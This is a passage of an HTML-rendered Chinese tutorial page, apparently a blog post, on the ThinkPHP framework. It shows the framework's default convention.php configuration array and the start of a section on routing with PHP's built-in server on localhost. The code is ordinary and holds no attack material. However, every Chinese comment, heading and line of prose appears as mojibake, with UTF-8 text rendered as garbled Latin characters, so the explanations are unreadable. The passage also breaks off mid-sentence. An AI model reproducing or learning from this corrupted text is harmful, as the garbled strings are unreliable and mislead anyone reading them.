Cookieå‰ç¼€ é¿å…å†²çª</span></span></span><br><span class="line"><span class="php">    <span class="string">'COOKIE_HTTPONLY'</span>       =&gt;  <span class="string">''</span>,      <span class="comment">// Cookie httponlyè®¾ç½®</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* é»˜è®¤è®¾å®š */</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_M_LAYER'</span>       =&gt;  <span class="string">'Model'</span>, <span class="comment">// é»˜è®¤çš„æ¨¡å‹å±‚åç§°</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_C_LAYER'</span>       =&gt;  <span class="string">'Controller'</span>, <span class="comment">// é»˜è®¤çš„æ§åˆ¶å™¨å±‚åç§°</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_V_LAYER'</span>       =&gt;  <span class="string">'View'</span>, <span class="comment">// é»˜è®¤çš„è§†å›¾å±‚åç§°</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_LANG'</span>          =&gt;  <span class="string">'zh-cn'</span>, <span class="comment">// é»˜è®¤è¯­è¨€</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_THEME'</span>         =&gt;  <span class="string">''</span>,<span class="comment">// é»˜è®¤æ¨¡æ¿ä¸»é¢˜åç§°</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_MODULE'</span>        =&gt;  <span class="string">'Home'</span>,  <span class="comment">// é»˜è®¤æ¨¡å—</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_CONTROLLER'</span>    =&gt;  <span class="string">'Index'</span>, <span class="comment">// é»˜è®¤æ§åˆ¶å™¨åç§°</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_ACTION'</span>        =&gt;  <span class="string">'index'</span>, <span class="comment">// é»˜è®¤æ“ä½œåç§°</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_CHARSET'</span>       =&gt;  <span class="string">'utf-8'</span>, <span class="comment">// é»˜è®¤è¾“å‡ºç¼–ç </span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_TIMEZONE'</span>      =&gt;  <span class="string">'PRC'</span>,<span class="comment">// é»˜è®¤æ—¶åŒº</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_AJAX_RETURN'</span>   =&gt;  <span class="string">'JSON'</span>,  <span class="comment">// é»˜è®¤AJAX æ•°æ®è¿”å›æ ¼å¼,å¯é€‰JSON XML ...</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_JSONP_HANDLER'</span> =&gt;  <span class="string">'jsonpReturn'</span>, <span class="comment">// é»˜è®¤JSONPæ ¼å¼è¿”å›çš„å¤„ç†æ–¹æ³•</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_FILTER'</span>        =&gt;  <span class="string">'htmlspecialchars'</span>, <span class="comment">// é»˜è®¤å‚æ•°è¿‡æ»¤æ–¹æ³• ç”¨äºIå‡½æ•°...</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* æ•°æ®åº“è®¾ç½® */</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_TYPE'</span>               =&gt;  <span class="string">''</span>,     <span class="comment">// æ•°æ®åº“ç±»å‹</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_HOST'</span>               =&gt;  <span class="string">''</span>, <span class="comment">// æœåŠ¡å™¨åœ°å€</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_NAME'</span>               =&gt;  <span class="string">''</span>,          <span class="comment">// æ•°æ®åº“å</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_USER'</span>               =&gt;  <span class="string">''</span>,      <span class="comment">// ç”¨æˆ·å</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_PWD'</span>                =&gt;  <span class="string">''</span>,          <span class="comment">// å¯†ç </span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_PORT'</span>               =&gt;  <span class="string">''</span>,        <span class="comment">// ç«¯å£</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_PREFIX'</span>             =&gt;  <span class="string">''</span>,    <span class="comment">// æ•°æ®åº“è¡¨å‰ç¼€</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_FIELDTYPE_CHECK'</span>    =&gt;  <span class="keyword">false</span>,       <span class="comment">// æ˜¯å¦è¿›è¡Œå­—æ®µç±»å‹æ£€æŸ¥</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_FIELDS_CACHE'</span>       =&gt;  <span class="keyword">true</span>,        <span class="comment">// å¯ç”¨å­—æ®µç¼“å­˜</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_CHARSET'</span>            =&gt;  <span class="string">'utf8'</span>,      <span class="comment">// æ•°æ®åº“ç¼–ç é»˜è®¤é‡‡ç”¨utf8</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_DEPLOY_TYPE'</span>        =&gt;  <span class="number">0</span>, <span class="comment">// æ•°æ®åº“éƒ¨ç½²æ–¹å¼:0 é›†ä¸­å¼(å•ä¸€æœåŠ¡å™¨),1 åˆ†å¸ƒå¼(ä¸»ä»æœåŠ¡å™¨)</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_RW_SEPARATE'</span>        =&gt;  <span class="keyword">false</span>,       <span class="comment">// æ•°æ®åº“è¯»å†™æ˜¯å¦åˆ†ç¦» ä¸»ä»å¼æœ‰æ•ˆ</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_MASTER_NUM'</span>         =&gt;  <span class="number">1</span>, <span class="comment">// è¯»å†™åˆ†ç¦»å ä¸»æœåŠ¡å™¨æ•°é‡</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_SLAVE_NO'</span>           =&gt;  <span class="string">''</span>, <span class="comment">// æŒ‡å®šä»æœåŠ¡å™¨åºå·</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_SQL_BUILD_CACHE'</span>    =&gt;  <span class="keyword">false</span>, <span class="comment">// æ•°æ®åº“æŸ¥è¯¢çš„SQLåˆ›å»ºç¼“å­˜</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_SQL_BUILD_QUEUE'</span>    =&gt;  <span class="string">'file'</span>,   <span class="comment">// SQLç¼“å­˜é˜Ÿåˆ—çš„ç¼“å­˜æ–¹å¼ æ”¯æŒ file xcacheå’Œapc</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_SQL_BUILD_LENGTH'</span>   =&gt;  <span class="number">20</span>, <span class="comment">// SQLç¼“å­˜çš„é˜Ÿåˆ—é•¿åº¦</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_SQL_LOG'</span>            =&gt;  <span class="keyword">false</span>, <span class="comment">// SQLæ‰§è¡Œæ—¥å¿—è®°å½•</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_BIND_PARAM'</span>         =&gt;  <span class="keyword">false</span>, <span class="comment">// æ•°æ®åº“å†™å…¥æ•°æ®è‡ªåŠ¨å‚æ•°ç»‘å®š</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* æ•°æ®ç¼“å­˜è®¾ç½® */</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_TIME'</span>       =&gt;  <span class="number">0</span>,      <span class="comment">// æ•°æ®ç¼“å­˜æœ‰æ•ˆæœŸ 0è¡¨ç¤ºæ°¸ä¹…ç¼“å­˜</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_COMPRESS'</span>   =&gt;  <span class="keyword">false</span>,   <span class="comment">// æ•°æ®ç¼“å­˜æ˜¯å¦å‹ç¼©ç¼“å­˜</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_CHECK'</span>      =&gt;  <span class="keyword">false</span>,   <span class="comment">// æ•°æ®ç¼“å­˜æ˜¯å¦æ ¡éªŒç¼“å­˜</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_PREFIX'</span>     =&gt;  <span class="string">''</span>,     <span class="comment">// ç¼“å­˜å‰ç¼€</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_TYPE'</span>       =&gt;  <span class="string">'File'</span>,  <span class="comment">// æ•°æ®ç¼“å­˜ç±»å‹,æ”¯æŒ:File|Db|Apc|Memcache|Shmop|Sqlite|Xcache|Apachenote|Eaccelerator</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_PATH'</span>       =&gt;  TEMP_PATH,<span class="comment">// ç¼“å­˜è·¯å¾„è®¾ç½® (ä»…å¯¹Fileæ–¹å¼ç¼“å­˜æœ‰æ•ˆ)</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_SUBDIR'</span>     =&gt;  <span class="keyword">false</span>,    <span class="comment">// ä½¿ç”¨å­ç›®å½•ç¼“å­˜ (è‡ªåŠ¨æ ¹æ®ç¼“å­˜æ ‡è¯†çš„å“ˆå¸Œåˆ›å»ºå­ç›®å½•)</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_PATH_LEVEL'</span>       =&gt;  <span class="number">1</span>,        <span class="comment">// å­ç›®å½•ç¼“å­˜çº§åˆ«</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* é”™è¯¯è®¾ç½® */</span></span></span><br><span class="line"><span class="php">    <span class="string">'ERROR_MESSAGE'</span>         =&gt;  <span class="string">'é¡µé¢é”™è¯¯ï¼è¯·ç¨åå†è¯•ï½'</span>,<span class="comment">//é”™è¯¯æ˜¾ç¤ºä¿¡æ¯,éè°ƒè¯•æ¨¡å¼æœ‰æ•ˆ</span></span></span><br><span class="line"><span class="php">    <span class="string">'ERROR_PAGE'</span>            =&gt;  <span class="string">''</span>,<span class="comment">// é”™è¯¯å®šå‘é¡µé¢</span></span></span><br><span class="line"><span class="php">    <span class="string">'SHOW_ERROR_MSG'</span>        =&gt;  <span class="keyword">false</span>,    <span class="comment">// æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯</span></span></span><br><span class="line"><span class="php">    <span class="string">'TRACE_MAX_RECORD'</span>      =&gt;  <span class="number">100</span>,    <span class="comment">// æ¯ä¸ªçº§åˆ«çš„é”™è¯¯ä¿¡æ¯ æœ€å¤§è®°å½•æ•°</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* æ—¥å¿—è®¾ç½® */</span></span></span><br><span class="line"><span class="php">    <span class="string">'LOG_RECORD'</span>            =&gt;  <span class="keyword">false</span>,   <span class="comment">// é»˜è®¤ä¸è®°å½•æ—¥å¿—</span></span></span><br><span class="line"><span class="php">    <span class="string">'LOG_TYPE'</span>              =&gt;  <span class="string">'File'</span>, <span class="comment">// æ—¥å¿—è®°å½•ç±»å‹ é»˜è®¤ä¸ºæ–‡ä»¶æ–¹å¼</span></span></span><br><span class="line"><span class="php">    <span class="string">'LOG_LEVEL'</span>             =&gt;  <span class="string">'EMERG,ALERT,CRIT,ERR'</span>,<span class="comment">// å…è®¸è®°å½•çš„æ—¥å¿—çº§åˆ«</span></span></span><br><span class="line"><span class="php">    <span class="string">'LOG_FILE_SIZE'</span>         =&gt;  <span class="number">2097152</span>,<span class="comment">// æ—¥å¿—æ–‡ä»¶å¤§å°é™åˆ¶</span></span></span><br><span class="line"><span class="php">    <span class="string">'LOG_EXCEPTION_RECORD'</span>  =&gt;  <span class="keyword">false</span>,    <span class="comment">// æ˜¯å¦è®°å½•å¼‚å¸¸ä¿¡æ¯æ—¥å¿—</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* SESSIONè®¾ç½® */</span></span></span><br><span class="line"><span class="php">    <span class="string">'SESSION_AUTO_START'</span>    =&gt;  <span class="keyword">true</span>,    <span class="comment">// æ˜¯å¦è‡ªåŠ¨å¼€å¯Session</span></span></span><br><span class="line"><span class="php">    <span class="string">'SESSION_OPTIONS'</span>       =&gt;  <span class="keyword">array</span>(), <span class="comment">// session é…ç½®æ•°ç»„ æ”¯æŒtype name id path expire domain ç­‰å‚æ•°</span></span></span><br><span class="line"><span class="php">    <span class="string">'SESSION_TYPE'</span>          =&gt;  <span class="string">''</span>, <span class="comment">// session handerç±»å‹ é»˜è®¤æ— éœ€è®¾ç½® é™¤éæ‰©å±•äº†session handeré©±åŠ¨</span></span></span><br><span class="line"><span class="php">    <span class="string">'SESSION_PREFIX'</span>        =&gt;  <span class="string">''</span>, <span class="comment">// session å‰ç¼€</span></span></span><br><span class="line"><span class="php">    <span class="comment">//'VAR_SESSION_ID'      =&gt;  'session_id',     //sessionIDçš„æäº¤å˜é‡</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* æ¨¡æ¿å¼•æ“è®¾ç½® */</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_CONTENT_TYPE'</span>     =&gt;  <span class="string">'text/html'</span>, <span class="comment">// é»˜è®¤æ¨¡æ¿è¾“å‡ºç±»å‹</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_ACTION_ERROR'</span>     =&gt;  THINK_PATH.<span class="string">'Tpl/dispatch_jump.tpl'</span>, <span class="comment">// é»˜è®¤é”™è¯¯è·³è½¬å¯¹åº”çš„æ¨¡æ¿æ–‡ä»¶</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_ACTION_SUCCESS'</span>   =&gt;  THINK_PATH.<span class="string">'Tpl/dispatch_jump.tpl'</span>, <span class="comment">// é»˜è®¤æˆåŠŸè·³è½¬å¯¹åº”çš„æ¨¡æ¿æ–‡ä»¶</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_EXCEPTION_FILE'</span>   =&gt;  THINK_PATH.<span class="string">'Tpl/think_exception.tpl'</span>,<span class="comment">// å¼‚å¸¸é¡µé¢çš„æ¨¡æ¿æ–‡ä»¶</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_DETECT_THEME'</span>     =&gt;  <span class="keyword">false</span>,       <span class="comment">// è‡ªåŠ¨ä¾¦æµ‹æ¨¡æ¿ä¸»é¢˜</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_TEMPLATE_SUFFIX'</span>  =&gt;  <span class="string">'.html'</span>,     <span class="comment">// é»˜è®¤æ¨¡æ¿æ–‡ä»¶åç¼€</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_FILE_DEPR'</span>        =&gt;  <span class="string">'/'</span>, <span class="comment">//æ¨¡æ¿æ–‡ä»¶CONTROLLER_NAMEä¸ACTION_NAMEä¹‹é—´çš„åˆ†å‰²ç¬¦</span></span></span><br><span class="line"><span class="php">    <span class="comment">// å¸ƒå±€è®¾ç½®</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_ENGINE_TYPE'</span>      =&gt;  <span class="string">'Think'</span>,     <span class="comment">// é»˜è®¤æ¨¡æ¿å¼•æ“ ä»¥ä¸‹è®¾ç½®ä»…å¯¹ä½¿ç”¨Thinkæ¨¡æ¿å¼•æ“æœ‰æ•ˆ</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_CACHFILE_SUFFIX'</span>  =&gt;  <span class="string">'.php'</span>,      <span class="comment">// é»˜è®¤æ¨¡æ¿ç¼“å­˜åç¼€</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_DENY_FUNC_LIST'</span>   =&gt;  <span class="string">'echo,exit'</span>,    <span class="comment">// æ¨¡æ¿å¼•æ“ç¦ç”¨å‡½æ•°</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_DENY_PHP'</span>         =&gt;  <span class="keyword">false</span>, <span class="comment">// é»˜è®¤æ¨¡æ¿å¼•æ“æ˜¯å¦ç¦ç”¨PHPåŸç”Ÿä»£ç </span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_L_DELIM'</span>          =&gt;  <span class="string">'&#123;'</span>,            <span class="comment">// æ¨¡æ¿å¼•æ“æ™®é€šæ ‡ç­¾å¼€å§‹æ ‡è®°</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_R_DELIM'</span>          =&gt;  <span class="string">'&#125;'</span>,            <span class="comment">// æ¨¡æ¿å¼•æ“æ™®é€šæ ‡ç­¾ç»“æŸæ ‡è®°</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_VAR_IDENTIFY'</span>     =&gt;  <span class="string">'array'</span>,     <span class="comment">// æ¨¡æ¿å˜é‡è¯†åˆ«ã€‚ç•™ç©ºè‡ªåŠ¨åˆ¤æ–­,å‚æ•°ä¸º'obj'åˆ™è¡¨ç¤ºå¯¹è±¡</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_STRIP_SPACE'</span>      =&gt;  <span class="keyword">true</span>,       <span class="comment">// æ˜¯å¦å»é™¤æ¨¡æ¿æ–‡ä»¶é‡Œé¢çš„htmlç©ºæ ¼ä¸æ¢è¡Œ</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_CACHE_ON'</span>         =&gt;  <span class="keyword">true</span>,        <span class="comment">// æ˜¯å¦å¼€å¯æ¨¡æ¿ç¼–è¯‘ç¼“å­˜,è®¾ä¸ºfalseåˆ™æ¯æ¬¡éƒ½ä¼šé‡æ–°ç¼–è¯‘</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_CACHE_PREFIX'</span>     =&gt;  <span class="string">''</span>,         <span class="comment">// æ¨¡æ¿ç¼“å­˜å‰ç¼€æ ‡è¯†ï¼Œå¯ä»¥åŠ¨æ€æ”¹å˜</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_CACHE_TIME'</span>       =&gt;  <span class="number">0</span>,         <span class="comment">// æ¨¡æ¿ç¼“å­˜æœ‰æ•ˆæœŸ 0 ä¸ºæ°¸ä¹…ï¼Œ(ä»¥æ•°å­—ä¸ºå€¼ï¼Œå•ä½:ç§’)</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_LAYOUT_ITEM'</span>      =&gt;  <span class="string">'&#123;__CONTENT__&#125;'</span>, <span class="comment">// å¸ƒå±€æ¨¡æ¿çš„å†…å®¹æ›¿æ¢æ ‡è¯†</span></span></span><br><span class="line"><span class="php">    <span class="string">'LAYOUT_ON'</span>             =&gt;  <span class="keyword">false</span>, <span class="comment">// æ˜¯å¦å¯ç”¨å¸ƒå±€</span></span></span><br><span class="line"><span class="php">    <span class="string">'LAYOUT_NAME'</span>           =&gt;  <span class="string">'layout'</span>, <span class="comment">// å½“å‰å¸ƒå±€åç§° é»˜è®¤ä¸ºlayout</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// Thinkæ¨¡æ¿å¼•æ“æ ‡ç­¾åº“ç›¸å…³è®¾å®š</span></span></span><br><span class="line"><span class="php">    <span class="string">'TAGLIB_BEGIN'</span>          =&gt;  <span class="string">'&lt;'</span>,  <span class="comment">// æ ‡ç­¾åº“æ ‡ç­¾å¼€å§‹æ ‡è®°</span></span></span><br><span class="line"><span class="php">    <span class="string">'TAGLIB_END'</span>            =&gt;  <span class="string">'&gt;'</span>,  <span class="comment">// æ ‡ç­¾åº“æ ‡ç­¾ç»“æŸæ ‡è®°</span></span></span><br><span class="line"><span class="php">    <span class="string">'TAGLIB_LOAD'</span>           =&gt;  <span class="keyword">true</span>, <span class="comment">// æ˜¯å¦ä½¿ç”¨å†…ç½®æ ‡ç­¾åº“ä¹‹å¤–çš„å…¶å®ƒæ ‡ç­¾åº“ï¼Œé»˜è®¤è‡ªåŠ¨æ£€æµ‹</span></span></span><br><span class="line"><span class="php">    <span class="string">'TAGLIB_BUILD_IN'</span>       =&gt;  <span class="string">'cx'</span>, <span class="comment">// å†…ç½®æ ‡ç­¾åº“åç§°(æ ‡ç­¾ä½¿ç”¨ä¸å¿…æŒ‡å®šæ ‡ç­¾åº“åç§°),ä»¥é€—å·åˆ†éš” æ³¨æ„è§£æé¡ºåº</span></span></span><br><span class="line"><span class="php">    <span class="string">'TAGLIB_PRE_LOAD'</span>       =&gt;  <span class="string">''</span>,   <span class="comment">// éœ€è¦é¢å¤–åŠ è½½çš„æ ‡ç­¾åº“(é¡»æŒ‡å®šæ ‡ç­¾åº“åç§°)ï¼Œå¤šä¸ªä»¥é€—å·åˆ†éš”</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* URLè®¾ç½® */</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_CASE_INSENSITIVE'</span>  =&gt;  <span class="keyword">true</span>,   <span class="comment">// é»˜è®¤false è¡¨ç¤ºURLåŒºåˆ†å¤§å°å†™ trueåˆ™è¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_MODEL'</span>             =&gt;  <span class="number">1</span>,       <span class="comment">// URLè®¿é—®æ¨¡å¼,å¯é€‰å‚æ•°0ã€1ã€2ã€3,ä»£è¡¨ä»¥ä¸‹å››ç§æ¨¡å¼ï¼š</span></span></span><br><span class="line"><span class="php">    <span class="comment">// 0 (æ™®é€šæ¨¡å¼); 1 (PATHINFO æ¨¡å¼); 2 (REWRITE  æ¨¡å¼); 3 (å…¼å®¹æ¨¡å¼)  é»˜è®¤ä¸ºPATHINFO æ¨¡å¼</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PATHINFO_DEPR'</span>     =&gt;  <span class="string">'/'</span>,<span class="comment">// PATHINFOæ¨¡å¼ä¸‹ï¼Œå„å‚æ•°ä¹‹é—´çš„åˆ†å‰²ç¬¦å·</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PATHINFO_FETCH'</span>    =&gt;  <span class="string">'ORIG_PATH_INFO,REDIRECT_PATH_INFO,REDIRECT_URL'</span>, <span class="comment">// ç”¨äºå…¼å®¹åˆ¤æ–­PATH_INFO å‚æ•°çš„SERVERæ›¿ä»£å˜é‡åˆ—è¡¨</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_REQUEST_URI'</span>       =&gt;  <span class="string">'REQUEST_URI'</span>, <span class="comment">// è·å–å½“å‰é¡µé¢åœ°å€çš„ç³»ç»Ÿå˜é‡ é»˜è®¤ä¸ºREQUEST_URI</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_HTML_SUFFIX'</span>       =&gt;  <span class="string">'html'</span>,  <span class="comment">// URLä¼ªé™æ€åç¼€è®¾ç½®</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_DENY_SUFFIX'</span>       =&gt;  <span class="string">'ico|png|gif|jpg'</span>, <span class="comment">// URLç¦æ­¢è®¿é—®çš„åç¼€è®¾ç½®</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PARAMS_BIND'</span>       =&gt;  <span class="keyword">true</span>, <span class="comment">// URLå˜é‡ç»‘å®šåˆ°Actionæ–¹æ³•å‚æ•°</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PARAMS_BIND_TYPE'</span>  =&gt;  <span class="number">0</span>, <span class="comment">// URLå˜é‡ç»‘å®šçš„ç±»å‹ 0 æŒ‰å˜é‡åç»‘å®š 1 æŒ‰å˜é‡é¡ºåºç»‘å®š</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PARAMS_FILTER'</span>     =&gt;  <span class="keyword">false</span>, <span class="comment">// URLå˜é‡ç»‘å®šè¿‡æ»¤</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PARAMS_FILTER_TYPE'</span>=&gt;  <span class="string">''</span>, <span class="comment">// URLå˜é‡ç»‘å®šè¿‡æ»¤æ–¹æ³• å¦‚æœä¸ºç©º è°ƒç”¨DEFAULT_FILTER</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_ROUTER_ON'</span>         =&gt;  <span class="keyword">false</span>,   <span class="comment">// æ˜¯å¦å¼€å¯URLè·¯ç”±</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_ROUTE_RULES'</span>       =&gt;  <span class="keyword">array</span>(), <span class="comment">// é»˜è®¤è·¯ç”±è§„åˆ™ é’ˆå¯¹æ¨¡å—</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_MAP_RULES'</span>         =&gt;  <span class="keyword">array</span>(), <span class="comment">// URLæ˜ å°„å®šä¹‰è§„åˆ™</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* ç³»ç»Ÿå˜é‡åç§°è®¾ç½® */</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_MODULE'</span>            =&gt;  <span class="string">'m'</span>,     <span class="comment">// é»˜è®¤æ¨¡å—è·å–å˜é‡</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_ADDON'</span>             =&gt;  <span class="string">'addon'</span>,     <span class="comment">// é»˜è®¤çš„æ’ä»¶æ§åˆ¶å™¨å‘½åç©ºé—´å˜é‡</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_CONTROLLER'</span>        =&gt;  <span class="string">'c'</span>,    <span class="comment">// é»˜è®¤æ§åˆ¶å™¨è·å–å˜é‡</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_ACTION'</span>            =&gt;  <span class="string">'a'</span>,    <span class="comment">// é»˜è®¤æ“ä½œè·å–å˜é‡</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_AJAX_SUBMIT'</span>       =&gt;  <span class="string">'ajax'</span>,  <span class="comment">// é»˜è®¤çš„AJAXæäº¤å˜é‡</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_JSONP_HANDLER'</span>     =&gt;  <span class="string">'callback'</span>,</span></span><br><span class="line"><span class="php">    <span class="string">'VAR_PATHINFO'</span>          =&gt;  <span class="string">'s'</span>,    <span class="comment">// å…¼å®¹æ¨¡å¼PATHINFOè·å–å˜é‡ä¾‹å¦‚ ?s=/module/action/id/1 åé¢çš„å‚æ•°å–å†³äºURL_PATHINFO_DEPR</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_TEMPLATE'</span>          =&gt;  <span class="string">'t'</span>,    <span class="comment">// é»˜è®¤æ¨¡æ¿åˆ‡æ¢å˜é‡</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="string">'HTTP_CACHE_CONTROL'</span>    =&gt;  <span class="string">'private'</span>,  <span class="comment">// ç½‘é¡µç¼“å­˜æ§åˆ¶</span></span></span><br><span class="line"><span class="php">    <span class="string">'CHECK_APP_DIR'</span>         =&gt;  <span class="keyword">true</span>,       <span class="comment">// æ˜¯å¦æ£€æŸ¥åº”ç”¨ç›®å½•æ˜¯å¦åˆ›å»º</span></span></span><br><span class="line"><span class="php">    <span class="string">'FILE_UPLOAD_TYPE'</span>      =&gt;  <span class="string">'Local'</span>,    <span class="comment">// æ–‡ä»¶ä¸Šä¼ æ–¹å¼</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CRYPT_TYPE'</span>       =&gt;  <span class="string">'Think'</span>,    <span class="comment">// æ•°æ®åŠ å¯†æ–¹å¼</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">);</span></span><br></pre></td></tr></table></figure></p><h1 id="è·¯ç”±"><a href="#è·¯ç”±" class="headerlink" title="è·¯ç”±"></a>è·¯ç”±</h1><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd <span class="regexp">/home/</span>shiyanlou/ThinkPHP</span><br><span class="line">php -S <span class="string">localhost:</span><span class="number">8999</span></span><br></pre></td></tr></table></figure><p>cd /home/shiyanlou/ThinkPHP<br>php -S localhost:8999<br>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬è®¿é—®åˆ°çš„æ˜¯ThinkPHPè‡ªå¸¦çš„é»˜è®¤å…¥å£æ–‡ä»¶index.phpä¹Ÿå°±æ˜¯è®¿é—®åˆ°çš„æ˜¯IndexControllerçš„index()æ–¹æ³•ï¼Œè¿™æ˜¯å› ä¸ºThinkPHPé»˜è®¤è®¾ç½®ï¼š<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'DEFAULT_CONTROLLER'</span>    =&gt;  <span class="string">'Index'</span></span><br></pre></td></tr></table></figure></p><p>å¦‚æœä½ æŸ¥çœ‹è¿‡ThinkPHP/Conf/convention.phpæ–‡ä»¶ï¼Œåº”è¯¥å°±ä¼šæ˜ç™½è¿™ä¸ªå…¶å®å°±æ˜¯è®¾ç½®é»˜è®¤çš„æ§åˆ¶å™¨ã€‚</p><p>å…³äºæ§åˆ¶å™¨(Controller)æˆ‘ä»¬åé¢ä¼šä»”ç»†è¯´ï¼Œæ§åˆ¶å™¨çš„æ–‡ä»¶ä½äºApplication/Home/Controller æ–‡ä»¶å¤¹ä¹‹ä¸‹</p><p>äº†è§£è¿™äº›åŸºæœ¬çŸ¥è¯†ä¹‹åï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬éœ€è¦è®¿é—®å…¶å®ƒçš„é¡µé¢ï¼Œè®¿é—®å…¶ä»–çš„æ§åˆ¶å™¨å’Œæ–¹æ³•å‘¢ï¼Ÿç­”æ¡ˆå°±åœ¨æœ¬èŠ‚çš„è·¯ç”±æ•™ç¨‹ä¸­ã€‚</p><h2 id="è·¯ç”±å®šä¹‰è§„åˆ™"><a href="#è·¯ç”±å®šä¹‰è§„åˆ™" class="headerlink" title="è·¯ç”±å®šä¹‰è§„åˆ™"></a>è·¯ç”±å®šä¹‰è§„åˆ™</h2><p>åœ¨ä½¿ç”¨è·¯ç”±ä¹‹å‰ï¼Œç¡®ä¿ä½ 